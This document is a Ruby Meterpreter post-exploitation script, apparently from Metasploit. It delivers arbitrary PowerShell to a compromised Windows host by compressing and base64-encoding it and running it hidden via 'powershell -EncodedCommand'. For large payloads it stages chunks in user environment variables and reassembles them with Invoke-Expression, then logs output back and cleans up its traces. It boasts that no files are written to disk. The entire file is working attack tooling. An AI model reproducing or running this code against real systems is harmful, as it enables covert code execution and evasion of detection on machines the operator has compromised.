# Meterpreter script to deliver and execute powershell scripts using
# a compression/encoding method based on the powershell PoC code
# from rel1k and winfang98 at DEF CON 18. This script furthers the
# idea by bypassing Windows' command character lmits, allowing the 
# execution of very large scripts. No files are ever written to disk.

# Author: nick[at]executionflow.org

require 'zlib'

def main(args, client)
	# Parse command-line arguments
	opts = Rex::Parser::Arguments.new(
		'-f' => [ true, 'full path to powershell script' ],
		'-h' => [ false, 'Help menu' ]
	)

	script_file = nil
	opts.parse(args) { |opt, idx, val|
		case opt
			when '-f'
				script_file = val
			when '-h'
				print_line(opts.usage)
			raise Rex::Script::Completed
		end
	}

	unless (script_file)
		print_error("Missing powershell script name.")
		raise Rex::Script::Completed
	 end

	# Instantiate client instance variable
	@client = client

	# List of running processes, open channels, and env variables...
	@running_pids, @open_channels = [], []

	# End of file marker
	@eof = Rex::Text.rand_text_alpha(8)
	
	# Suffix for environment variables
	@env_suffix = Rex::Text.rand_text_alpha(8)

	# Get target's computer name
	computer_name = @client.sys.config.sysinfo['Computer']

	# Create unique log directory
	log_dir = ::File.join(Msf::Config.log_directory,'scripts', computer_name)
	::FileUtils.mkdir_p(log_dir)

	# Define log filename
	script_ext  = ::File.extname(script_file)
	script_base = ::File.basename(script_file, script_ext)
	time_stamp  = ::Time.now.strftime('%Y%m%d:%H%M%S')
	log_file    = ::File.join(log_dir,"#{script_base}-#{time_stamp}.txt")

	# Compress 
	print_status('Compressing script contents:')
	compressed_script = compress_script(script_file, true)

	# If the compressed size is > 8100 bytes, launch stager
	if (compressed_script.size > 8100)
		print_error(" - Compressed size: #{compressed_script.size}")
		error_msg =  "Compressed size may cause command to exceed "
		error_msg += "cmd.exe's 8kB character limit."
		print_error(error_msg)
		print_status('Launching stager:')
		script = stage_to_env(compressed_script)
		print_good("Payload successfully staged.")
	else
		print_good(" - Compressed size: #{compressed_script.size}")
		script = compressed_script 
	end

	# Execute the powershell script
	print_status('Executing the script.')
	cmd_out = execute_script(script)

	# Write output to log
	print_status("Logging output to #{log_file}.")
	write_to_log(cmd_out, log_file)

	# Clean up
	print_status('Cleaning up residual objects and processes.')
	clean_up()

	# That's it
	print_good('Finished!')
	raise Rex::Script::Completed
end

def compress_script(script, eof = nil)
	script_in = ''
	begin
		# Open script file for reading
		fd = ::File.new(script, 'r')
		while (line = fd.gets)
			script_in << line
		end

		# Close open file
		fd.close()
	rescue Errno::ENAMETOOLONG, Errno::ENOENT
		# Treat script as a... script
		script_in = script
	end

	# Compress using the Deflate algorithm
	compressed_stream = ::Zlib::Deflate.deflate(script_in,
		::Zlib::BEST_COMPRESSION)
	
	# Base64 encode the compressed file contents
	encoded_stream = Rex::Text.encode_base64(compressed_stream) 
	
	# Build the powershell expression 
	# Decode base64 encoded command and create a stream object
	psh_expression =  "$stream = New-Object IO.MemoryStream(,"
	psh_expression += "$([Convert]::FromBase64String('#{encoded_stream}')));"
	# Read & delete the first two bytes due to incompatibility with MS
	psh_expression += "$stream.ReadByte()|Out-Null;"
	psh_expression += "$stream.ReadByte()|Out-Null;"
	# Uncompress and invoke the expression (execute)
	psh_expression += "$(Invoke-Expression $(New-Object IO.StreamReader("
	psh_expression += "$(New-Object IO.Compression.DeflateStream("
	psh_expression += "$stream,"
	psh_expression += "[IO.Compression.CompressionMode]::Decompress)),"
	psh_expression += "[Text.Encoding]::ASCII)).ReadToEnd());"

	# If eof is set, add a marker to signify end of script output
	if (eof) then psh_expression += "'#{@eof}'" end
	
	# Convert expression to unicode
	unicode_expression = Rex::Text.to_unicode(psh_expression)

	# Base64 encode the unicode expression
	encoded_expression = Rex::Text.encode_base64(unicode_expression)

	return encoded_expression
end
	
def execute_script(script)
	# Execute using -EncodedCommand
	cmd_out = @client.sys.process.execute("powershell -EncodedCommand " +
		"#{script}", nil, {'Hidden' => true, 'Channelized' => true})

	# Add to list of running processes
	@running_pids << cmd_out.pid

	# Add to list of open channels
	@open_channels << cmd_out

	return cmd_out
end

def stage_to_env(compressed_script)
	# Divide the encoded script into 8000 byte chunks and iterate
	index = 0
	count = 8000 
	while (index < compressed_script.size - 1)
		# Define random, but serialized variable name
		env_prefix = "%05d" % ((index + 8000)/8000)
		env_variable = env_prefix + @env_suffix

		# Create chunk
		chunk = compressed_script[index, count]

		# Build the set commands
		set_env_variable =  "[Environment]::SetEnvironmentVariable("
		set_env_variable += "'#{env_variable}',"
		set_env_variable += "'#{chunk}', 'User')"

		# Compress and encode the set command
		encoded_stager = compress_script(set_env_variable)

		# Stage the payload
		print_good(" - Bytes remaining: #{compressed_script.size - index}")
		execute_script(encoded_stager)

		# Increment index
		index += count

	end

	# Build the script reassembler
	reassemble_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
	reassemble_command += "Select-String #{@env_suffix}|Sort-Object|%{"
	reassemble_command += "$c+=[Environment]::GetEnvironmentVariable($_,'User')"
	reassemble_command += "};Invoke-Expression $($([Text.Encoding]::Unicode."
	reassemble_command += "GetString($([Convert]::FromBase64String($c)))))"

	# Compress and encode the reassemble command
	encoded_script = compress_script(reassemble_command)

	return encoded_script
end

def write_to_log(cmd_out, log_file)
	# Open log file for writing
	fd = ::File.new(log_file, 'w+')

	# Read output until eof and write to log
	while (line = cmd_out.channel.read())
		if (line.sub!(/#{@eof}/, ''))
			fd.write(line)
			cmd_out.channel.close()
			break
		end
		fd.write(line)
	end

	# Close log file
	fd.close()

	return
end

def clean_up()
	# Remove environment variables
	env_del_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
	env_del_command += "Select-String #{@env_suffix}|%{"
	env_del_command += "[Environment]::SetEnvironmentVariable($_,$null,'User')}"
	script = compress_script(env_del_command, true)
	cmd_out = execute_script(script)
	write_to_log(cmd_out, "/dev/null")

	# Kill running processes
	@running_pids.each() do |pid|
		@client.sys.process.kill(pid)
	end

	# Close open channels
	@open_channels.each() do |chan|
		chan.channel.close()
	end

	return
end

main(args, client)
